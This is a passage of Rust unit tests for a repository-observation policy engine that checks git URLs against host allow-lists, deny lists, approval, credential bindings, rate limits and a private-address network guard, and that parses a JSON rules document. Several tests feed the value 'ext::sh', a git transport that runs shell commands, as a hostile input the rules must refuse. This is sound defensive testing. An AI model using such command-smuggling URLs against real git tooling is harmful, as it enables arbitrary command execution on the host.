        assert!(rejected(Rule::Limits)(&at(20)));
        assert!(rejected(Rule::Limits)(&at(5000)));
    }

    // --- 7: approval

    #[test]
    fn when_approval_is_required_an_unlisted_repository_waits() {
        let mut rules = base();
        rules.require_approval = true;
        let d = ask("https://github.com/o/r", &rules);
        assert!(pending(Waiting::Approval)(&d), "{d:?}");
        rules.approved.insert(id("https://github.com/o/r"));
        for url in [
            "https://github.com/o/r",
            "https://github.com/o/r.git",
            "HTTPS://GITHUB.COM/o/r/",
        ] {
            assert!(matches!(ask(url, &rules), Decision::Accepted(_)), "{url}");
        }
        assert!(pending(Waiting::Approval)(&ask(
            "https://github.com/o/other",
            &rules
        )));
    }

    // --- 8: the credential

    #[test]
    fn a_bound_credential_is_named_and_an_anonymous_host_names_none() {
        let mut rules = base();
        rules.credentials = vec![Binding {
            host: "*.example.org".into(),
            name: "example-sei".into(),
        }];
        let Decision::Accepted(a) = ask("https://git.example.org/o/r", &rules) else {
            panic!()
        };
        assert_eq!(a.credential.as_deref(), Some("example-sei"));
        let Decision::Accepted(a) = ask("https://github.com/o/r", &rules) else {
            panic!()
        };
        assert_eq!(a.credential, None);
    }

    #[test]
    fn a_host_with_neither_a_binding_nor_an_anonymous_entry_waits_for_a_credential() {
        let mut rules = base();
        rules.anonymous.clear();
        let d = ask("https://github.com/o/r", &rules);
        assert!(pending(Waiting::Credential)(&d), "{d:?}");
        rules.credentials = vec![Binding {
            host: "github.com".into(),
            name: "gh".into(),
        }];
        assert!(matches!(
            ask("https://github.com/o/r", &rules),
            Decision::Accepted(_)
        ));
    }

    #[test]
    fn a_binding_is_preferred_to_anonymous_and_the_first_binding_wins() {
        let mut rules = base();
        rules.credentials = vec![
            Binding {
                host: "github.com".into(),
                name: "first".into(),
            },
            Binding {
                host: "github.com".into(),
                name: "second".into(),
            },
        ];
        let Decision::Accepted(a) = ask("https://github.com/o/r", &rules) else {
            panic!()
        };
        assert_eq!(a.credential.as_deref(), Some("first"));
    }

    // --- 9: accepted

    #[test]
    fn what_is_accepted_is_the_canonical_url_and_its_id_not_the_text_that_arrived() {
        let Decision::Accepted(a) = ask("HTTPS://GitHub.COM:443/Org/Repo.git#readme", &base())
        else {
            panic!()
        };
        assert_eq!(a.url, "https://github.com/Org/Repo.git");
        assert_eq!(a.repo_id, id("https://github.com/Org/Repo"));
    }

    // --- the order

    #[test]
    fn the_first_rule_that_decides_is_the_one_reported() {
        // Fails the proposer rule and the URL rule: the proposer is first.
        let (d, _) = ask_with("ext::sh", None, Some(&base()), standing(), public());
        assert!(rejected(Rule::Proposer)(&d), "{d:?}");

        // Fails the URL rule and the host rule: the URL is first.
        assert!(rejected(Rule::Url)(&ask("http://gitlab.com/o/r", &base())));

        // Denied and not an allowed host: denied is first.
        let mut rules = base();
        rules.denied.insert(id("https://gitlab.com/o/r"));
        assert!(rejected(Rule::Denied)(&ask(
            "https://gitlab.com/o/r",
            &rules
        )));

        // Not an allowed host and resolves privately: the host is first, and nothing is resolved.
        let (d, resolved) = ask_with(
            "https://gitlab.com/o/r",
            Some(JIRA),
            Some(&base()),
            standing(),
            Ok(vec![IpAddr::V4(Ipv4Addr::LOCALHOST)]),
        );
        assert!(rejected(Rule::Host)(&d), "{d:?}");
        assert_eq!(resolved, 0);

        // Resolves privately and the set is full: the network guard is first.
        let (d, _) = ask_with(
            "https://github.com/o/r",
            Some(JIRA),
            Some(&base()),
            Standing {
                accepted_entries: 500,
                proposed_this_hour: 0,
            },
            Ok(vec![IpAddr::V4(Ipv4Addr::LOCALHOST)]),
        );
        assert!(rejected(Rule::Network)(&d), "{d:?}");

        // The set is full and approval is required: the limit is first.
        let mut rules = base();
        rules.require_approval = true;
        let (d, _) = ask_with(
            "https://github.com/o/r",
            Some(JIRA),
            Some(&rules),
            Standing {
                accepted_entries: 500,
                proposed_this_hour: 0,
            },
            public(),
        );
        assert!(rejected(Rule::Limits)(&d), "{d:?}");

        // Approval is required and no credential: approval is first.
        let mut rules = base();
        rules.require_approval = true;
        rules.anonymous.clear();
        assert!(pending(Waiting::Approval)(&ask(
            "https://github.com/o/r",
            &rules
        )));
    }

    #[test]
    fn the_same_question_has_the_same_answer() {
        let rules = base();
        let a = ask("https://github.com/o/r", &rules);
        assert_eq!(a, ask("https://github.com/o/r", &rules));
    }

    // --- reading the rules

    fn doc() -> Value {
        json!({
            "kind": "observe-repo",
            "rules": {
                "hosts": ["github.com", "*.example.org"],
                "organisations": { "github.com": ["CMU-SEI"] },
                "proposers": [JIRA],
                "require_approval": true,
                "approved": ["https://github.com/cmu-sei/Polar.git"],
                "denied": ["https://github.com/cmu-sei/bad"],
                "credentials": [ { "host": "*.example.org", "name": "example-sei" } ],
                "anonymous": ["github.com"],
                "limits": { "max_entries": 50, "per_proposer_per_hour": 5 }
            }
        })
    }

    fn problems(body: Value) -> Vec<String> {
        Rules::parse(&body).expect_err("the body should be refused")
    }

    #[test]
    fn a_document_is_read_into_rules() {
        let rules = Rules::parse(&doc()).unwrap();
        assert_eq!(rules.hosts, ["github.com", "*.example.org"]);
        assert_eq!(
            rules.organisations["github.com"],
            ["cmu-sei"],
            "organisations are kept in lower case"
        );
        assert_eq!(rules.proposers, [JIRA]);
        assert!(rules.require_approval);
        assert!(
            rules
                .approved
                .contains(&id("https://github.com/cmu-sei/Polar"))
        );
        assert!(rules.denied.contains(&id("https://github.com/cmu-sei/bad")));
        assert_eq!(
            rules.credentials,
            [Binding {
                host: "*.example.org".into(),
                name: "example-sei".into()
            }]
        );
        assert_eq!(rules.anonymous, ["github.com"]);
        assert_eq!(
            rules.limits,
            Limits {
                max_entries: 50,
                per_proposer_per_hour: 5
            }
        );
    }

    #[test]
    fn what_is_left_out_is_the_safe_default() {
        let rules = Rules::parse(&json!({
            "kind": "observe-repo",
            "rules": { "hosts": ["github.com"], "proposers": [JIRA] }
        }))
        .unwrap();
        assert!(
            rules.require_approval,
            "approval is required unless the rules say otherwise"
        );
        assert!(rules.approved.is_empty() && rules.denied.is_empty());
        assert!(rules.credentials.is_empty() && rules.anonymous.is_empty());
        assert!(rules.organisations.is_empty());
        assert_eq!(rules.limits.max_entries, DEFAULT_MAX_ENTRIES);
        assert_eq!(
            rules.limits.per_proposer_per_hour,
            DEFAULT_PER_PROPOSER_PER_HOUR
        );
    }

    #[test]
    fn a_document_that_does_not_fit_is_refused_with_the_field_named() {
        let with = |path: &[&str], value: Value| {
            let mut d = doc();
            let mut cur = &mut d;
            for key in &path[..path.len() - 1] {
                cur = &mut cur[*key];
            }
            cur[path[path.len() - 1]] = value;
            d
        };
        let without = |key: &str| {
            let mut d = doc();
            d["rules"].as_object_mut().unwrap().remove(key);
            d
        };
        let cases: Vec<(Value, &str)> = vec![
            (json!([]), "object"),
            (json!({"rules": {}}), "kind"),
            (with(&["kind"], json!("observe-bucket")), "kind"),
            (json!({"kind": "observe-repo"}), "rules"),
            (with(&["extra"], json!(1)), "extra"),
            (with(&["rules", "extra"], json!(1)), "extra"),
            (without("hosts"), "hosts"),
            (without("proposers"), "proposers"),
            (with(&["rules", "hosts"], json!("github.com")), "hosts"),
            (with(&["rules", "hosts"], json!(["*"])), "hosts"),
            (with(&["rules", "hosts"], json!(["a.*.com"])), "hosts"),
            (with(&["rules", "hosts"], json!(["git hub.com"])), "hosts"),
            (with(&["rules", "proposers"], json!([""])), "proposers"),
            (with(&["rules", "proposers"], json!([3])), "proposers"),
            (
                with(&["rules", "require_approval"], json!("yes")),
                "require_approval",
            ),
            (with(&["rules", "approved"], json!(["ext::sh"])), "approved"),
            (
                with(&["rules", "approved"], json!(["http://github.com/o/r"])),
                "approved",
            ),
            (
                with(&["rules", "denied"], json!(["https://127.0.0.1/o/r"])),
                "denied",
            ),
            (
                with(&["rules", "credentials"], json!([{"host": "github.com"}])),
                "credentials",
            ),
            (
                with(
                    &["rules", "credentials"],
                    json!([{"host": "github.com", "name": "Bad Name"}]),
                ),
                "credentials",
            ),
            (
                with(
                    &["rules", "credentials"],
                    json!([{"host": "*", "name": "x"}]),
                ),
                "credentials",
            ),
            (
                with(
                    &["rules", "credentials"],
                    json!([{"host": "github.com", "name": "x", "extra": 1}]),
                ),
                "credentials",
            ),
            (
                with(&["rules", "anonymous"], json!(["http://github.com"])),
                "anonymous",
            ),
            (
                with(&["rules", "organisations"], json!({"*": ["x"]})),
                "organisations",
            ),
            (
                with(&["rules", "organisations"], json!({"github.com": "x"})),
                "organisations",
            ),
            (
                with(&["rules", "limits", "max_entries"], json!(0)),
                "max_entries",
            ),
            (
                with(
                    &["rules", "limits", "max_entries"],
                    json!(MAX_MAX_ENTRIES + 1),
                ),
                "max_entries",
            ),
            (
                with(&["rules", "limits", "per_proposer_per_hour"], json!(0)),
                "per_proposer_per_hour",
            ),
            (
                with(&["rules", "limits", "per_proposer_per_hour"], json!(-1)),
                "per_proposer_per_hour",
            ),
            (with(&["rules", "limits", "extra"], json!(1)), "extra"),
        ];
        for (body, field) in cases {
            let found = problems(body.clone());
            assert!(
                found.iter().any(|p| p.contains(field)),
                "{field}: {found:?} for {body}"
            );
        }
    }

    #[test]
    fn a_list_longer_than_the_bound_is_refused() {
        let many: Vec<Value> = (0..=MAX_LIST)
            .map(|i| json!(format!("https://github.com/o/r{i}")))
            .collect();
        let mut d = doc();
        d["rules"]["denied"] = Value::Array(many);
        assert!(problems(d).iter().any(|p| p.contains("denied")));
    }

    #[test]
    fn every_problem_is_reported_not_just_the_first() {
        let mut d = doc();
        d["rules"]["hosts"] = json!(["*"]);
        d["rules"]["limits"]["max_entries"] = json!(0);
        d["rules"]["approved"] = json!(["ext::sh"]);
        assert!(problems(d).len() >= 3);
    }
}
